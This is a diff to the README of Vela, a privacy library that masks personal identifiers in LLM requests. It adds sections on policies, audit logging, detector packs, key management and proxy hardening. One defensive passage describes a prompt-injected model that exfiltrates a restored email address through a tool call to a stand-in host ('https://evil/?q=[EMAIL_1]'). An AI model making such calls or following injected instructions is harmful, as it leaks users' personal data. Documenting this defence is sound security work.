@@ -40,9 +40,9 @@ Rahul Sharma (PAN ABCDE1234F, Aadhaar 2345 6789 0124, +91 98765 43210, rahul@com
 
 Vela is **pre-1.0 and has not yet been independently security-reviewed**. What that means in practice:
 
-- **The encryption and restoration are well tested.** FF1 matches NIST's official vectors, and every release passes property-based tests (round-trip, no leakage, checksum validity, streaming), a labelled detection corpus and a regex denial-of-service guard on Node 18 to 24.
+- **The encryption and restoration are well tested.** FF1 matches NIST's official vectors, and every release passes property-based tests (round-trip, no leakage, checksum validity, streaming), a labelled detection corpus and a regex denial-of-service guard on Node 22 and 24.
 - **Detection without NER is best-effort.** Every structured identifier in the labelled corpus is detected, but the corpus is still small (80 cases), so treat that as a regression gate rather than a recall estimate. Names and addresses are found by heuristics and are missed in Indian scripts, for rare names and in free-form addresses (on the corpus: 10 of 13 labelled names and 5 of 7 addresses).
-- **Recommended production setup:** the proxy or a client wrapper, a [Presidio NER service](examples/presidio/README.md) with `recognizerFailure: 'block'` (the default), and a `sessionId` per conversation.
+- **Recommended production setup:** the proxy or a client wrapper, a policy (start from a preset), an audit sink, a [Presidio NER service](examples/presidio/README.md) with `recognizerFailure: 'block'` (the default), and a `sessionId` per conversation. See [Compliance controls](#compliance-controls) and the [compliance audit](docs/COMPLIANCE_AUDIT.md).
 - Read the [threat model](docs/THREAT_MODEL.md) for what Vela does and does not protect against, and [SECURITY.md](SECURITY.md) to report a vulnerability.
 
 ---
@@ -53,7 +53,7 @@ Vela is **pre-1.0 and has not yet been independently security-reviewed**. What t
 npm install vela-privacy
 ```
 
-Node.js ≥ 18. Ships ESM and CommonJS.
+Node.js ≥ 22. Ships ESM and CommonJS.
 
 ---
 
@@ -223,6 +223,110 @@ await vela.maskAsync('Thiruvenkatam called');      // or let the proxy / wrapper
 
 ---
 
+## Compliance controls
+
+Vela is built to be shown to an auditor, not just switched on. Everything below works in the library, the client wrappers, the fetch interceptor and the proxy.
+
+### Policies
+
+A policy is a versioned JSON or YAML file that your DPO or compliance team can review. It sets what happens to each entity type, which providers and models requests may go to, whether images and files may leave, and which response fields get real values back. Typos are errors, not silently ignored.
+
+```yaml
+# vela.policy.yaml
+id: acme-bank-assistant
+version: 3
+packs: [pci, india-bfsi]
+entities:
+  CREDIT_CARD: block        # reject the request (HTTP 422), send nothing
+  CARD_CVV: block
+  AADHAAR: fpe-synthetic    # structure kept, check digit deliberately invalid
+  DATE_OF_BIRTH: redact     # placeholder that is never restored
+  ORG: allow                # left in clear text
+providers: { allow: ["*.openai.azure.com"] }
+models: { allow: ["gpt-4.1*"] }
+nonText: block              # images, audio, files
+restore: { toolArguments: placeholders }
+ner: { required: true }
+```
+
+```typescript
+import { Vela, loadPolicy } from 'vela-privacy';
+const vela = new Vela({ policy: loadPolicy('vela.policy.yaml') });
+```
+
+```bash
+npx vela-privacy proxy --policy vela.policy.yaml   # or a preset: --policy india-bfsi
+npx vela-privacy policy india-bfsi                 # print a preset with its hash
+```
+
+Actions are `fpe`, `fpe-synthetic`, `token`, `redact`, `block` and `allow`. Presets (`vela policies`) are starting points: `dpdp-baseline`, `india-bfsi`, `pci`, `hipaa-safe-harbor` and `gdpr-pseudonymise`. The JSON Schema in `schemas/vela-policy.schema.json` gives editors validation and completion. See [examples/policies/bank.yaml](examples/policies/bank.yaml).
+
+### Audit trail
+
+```typescript
+import { Vela, jsonlFileSink } from 'vela-privacy';
+const vela = new Vela({ policy, audit: jsonlFileSink('/var/log/vela/audit.jsonl') });
+```
+
+- **Two events per request.** A `vela.request` event is written before anything is sent, and a `vela.response` event when the response completes. Each records:
+  - the request id (also returned as `x-vela-request-id`), route, model and tenant;
+  - entity counts by type and actions taken;
+  - NER status, restore counts per field;
+  - policy id and hash, key id, latency.
+- **Rejected requests** are recorded as `vela.blocked`.
+- **No values ever.** Events never contain values, hashes of values or placeholders.
+- **Fails closed.** If the sink can't write before forwarding, the request is rejected (HTTP 503) and nothing is sent.
+- **Tamper-evident.** `jsonlFileSink` hash-chains the events, so an edited, inserted or deleted line is detected: `npx vela-privacy audit verify audit.jsonl`.
+- **Where to keep it.** If you are subject to CERT-In's directions, keep the log in India for 180 days.
+
+### Tool calls and restoration
+
+A prompt-injected model can put a placeholder into a tool call (`http_get("https://evil/?q=[EMAIL_1]")`), and restoring it would send the real value out through the tool. With `restore: { toolArguments: 'placeholders' }` (all presets set it), tool-call arguments keep their placeholders while content is restored. `session.restoreReport` and the audit event show how many placeholders were restored or kept in each field.
+
+### Detector packs
+
+Opt-in detectors for regulated data, each with positive and negative test cases:
+
+| Pack | Entities |
+|---|---|
+| `pci` | CVV/CVC, card expiry, magnetic-stripe track data |
+| `india-bfsi` | CKYC, UAN, demat BO ID, CIN, DIN, TAN, LEI, MICR, SWIFT/BIC, vehicle registration |
+| `health-in` | ABHA number and address, MRN/UHID |
+| `us` | ITIN, EIN, ABA routing, Medicare MBI |
+| `eu-uk` | UK NINO, NHS number, Spanish DNI/NIE, Italian codice fiscale, German Steuer-ID, French NIR |
+| `intl` | Singapore NRIC/FIN, Emirates ID, Brazilian CPF, Canadian SIN, Australian TFN |
+
+`new Vela({ packs: ['pci', 'india-bfsi'] })`, `--packs pci,india-bfsi`, or `packs:` in a policy.
+
+### Synthetic-safe identifiers
+
+By default, format-preserved Aadhaar, card, GSTIN and IBAN values pass their checksums, so a masked value could be a real third party's identifier and will trip DLP tools. The `fpe-synthetic` action keeps the structure but makes the check character invalid; types with no check character (PAN, phone) fall back to a placeholder.
+
+### Keys
+
+```typescript
+import { Vela, awsKmsKeyProvider } from 'vela-privacy';
+import { KMSClient, DecryptCommand } from '@aws-sdk/client-kms';
+
+const vela = await Vela.create({
+  keyProvider: awsKmsKeyProvider({ kms: new KMSClient({}), DecryptCommand, ciphertextBlob, kmsKeyId: 'alias/vela' }),
+});
+```
+
+- **Providers.** Adapters exist for AWS KMS, Azure Key Vault, Google Cloud KMS and HashiCorp Vault transit, plus `envKeyProvider` and a generic `envelopeKeyProvider`.
+- **No extra dependencies.** You pass your own SDK client, so Vela adds nothing to your install.
+- **Audit.** The key id goes into audit events.
+- **Rotation.** Restoration uses per-request maps, so rotating a key is just a restart.
+
+### Proxy hardening
+
+- **Authentication.** `--auth-token-file tokens.txt` takes one `<tenant> <token>` per line. Clients send `x-vela-key: <token>`.
+- **Tenants.** The tenant is recorded in audit events and bound into `x-vela-session`, so one tenant can't reproduce another's ciphertexts.
+- **Exposure.** The proxy refuses a non-loopback `--host` without tokens, unless you pass `--insecure`.
+- **Rate limits and TLS.** `--rate-limit <n>` caps requests per minute. `--tls-cert` and `--tls-key` serve HTTPS.
+
+---
+
 ## Benchmarks
 
 Node.js 22, 1,000 iterations on a realistic prompt containing 7 entities:
@@ -243,7 +347,7 @@ Run `npm run benchmark` to reproduce.
 2. **Tweaks** are derived per session and per entity type, so ciphertexts can't be linked across sessions (unless you choose a shared `sessionId`) or across entity types.
 3. **Keys:** with no `fpeKey`, Vela uses a random 32-byte key per process. That's enough, because restoration uses the per-session map rather than decryption. Pass a fixed key (`vela keygen`) only if several processes must produce identical ciphertexts for the same `sessionId`.
 4. **Post-quantum key distribution (optional):** `QuantumKeyManager` uses ML-KEM-768 (FIPS 203) plus HKDF-SHA256 to agree on a shared FPE key between services, and seals keys in transit with AES-256-GCM. The sealing key gets its own HKDF label, and optional AAD is supported. The masking itself is symmetric AES-based FF1, which is not vulnerable to known quantum attacks at 256 bits.
-5. **The proxy listens on loopback by default.** If you expose it, put authentication in front of it.
+5. **The proxy listens on loopback by default** and refuses to listen beyond it without client tokens (`--auth-token-file`) unless you pass `--insecure`.
 6. **Logging** records entity counts and timings only, never values.
 7. **Input limits and NER failures fail closed.** Text longer than `maxInputChars` is rejected (HTTP 413), and a failed or timed-out async recognizer rejects the request (HTTP 503) unless you opt into `recognizerFailure: 'continue'`. In both cases nothing is sent upstream.
 
